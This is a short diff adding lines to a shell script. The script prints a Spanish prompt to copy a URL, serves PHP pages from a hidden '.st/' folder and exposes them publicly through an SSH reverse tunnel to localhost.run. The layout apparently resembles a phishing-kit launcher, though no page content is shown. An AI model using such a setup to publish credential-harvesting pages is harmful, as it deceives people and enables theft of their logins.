@@ -1,0 +1,4 @@
+bash .banner
+echo "Copia la url que de dejara mas abajo que te la solicitaremos mas tarde!!"
+echo ""
+php -S localhost:4444 -t .st/ | ssh -R 80:localhost:4444 ssh.localhost.run
